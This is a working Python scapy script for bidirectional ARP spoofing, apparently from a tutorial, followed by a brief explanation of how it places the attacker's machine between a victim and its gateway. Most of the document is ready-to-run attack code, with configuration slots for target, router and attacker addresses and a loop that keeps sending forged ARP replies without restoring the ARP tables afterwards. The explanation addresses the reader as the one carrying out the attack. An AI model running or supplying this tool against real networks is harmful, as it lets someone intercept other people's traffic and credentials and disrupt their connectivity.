from scapy.all import ARP, send
import time

# =============================
# CONFIGURATION SECTION
# =============================

# Target (victim) device information
target_ip = "192.168.13.128"
target_mac = "00:0c:29:9d:d9:97"

# Router (gateway) information
router_ip = "192.168.13.2"
router_mac = "00:50:56:fa:96:35"

# Attacker's MAC address (this machine)
attacker_mac = "00:0c:29:97:05:57"

# Spoofing interval (in seconds)
spoof_interval = 2

# =============================
# FUNCTIONS
# =============================

def spoof(device_ip, device_mac, spoofed_ip):
    """
    Sends an ARP reply to device_ip claiming that spoofed_ip is at attacker_mac.
    """
    packet = ARP(
        op=2,                        # 2 means ARP reply
        pdst=device_ip,             # Destination IP (victim or router)
        hwdst=device_mac,           # Destination MAC (victim or router)
        psrc=spoofed_ip,            # IP you're pretending to be
        hwsrc=attacker_mac          # Your MAC (spoofing origin)
    )
    print(f"[INFO] Spoofing {device_ip} -> Claiming {spoofed_ip} is at {attacker_mac}")
    send(packet, verbose=False)

def mitm_loop():
    """
    Repeatedly send spoofed ARP replies to both the router and the victim.
    """
    print("[*] Starting ARP spoofing (CTRL+C to stop)...")
    try:
        while True:
            # Spoof the target, pretending to be the router
            spoof(target_ip, target_mac, router_ip)

            # Spoof the router, pretending to be the target
            spoof(router_ip, router_mac, target_ip)

            time.sleep(spoof_interval)

    except KeyboardInterrupt:
        print("\n[!] Spoofing stopped by user.")
        print("[!] You may want to restore the original ARP tables manually.")

# =============================
# ENTRY POINT
# =============================

if __name__ == "__main__":
    mitm_loop()

🧠 How It Works
Concept

You're performing bidirectional ARP spoofing:

    Tell the target that you (attacker) are the router.

    Tell the router that you (attacker) are the target.

This places your machine in the middle of all traffic — MITM attack.
ARP Operation Codes

    op=1: ARP Request (who has IP x.x.x.x?)

    op=2: ARP Reply (IP x.x.x.x is at MAC xx:xx:xx:xx:xx:xx)
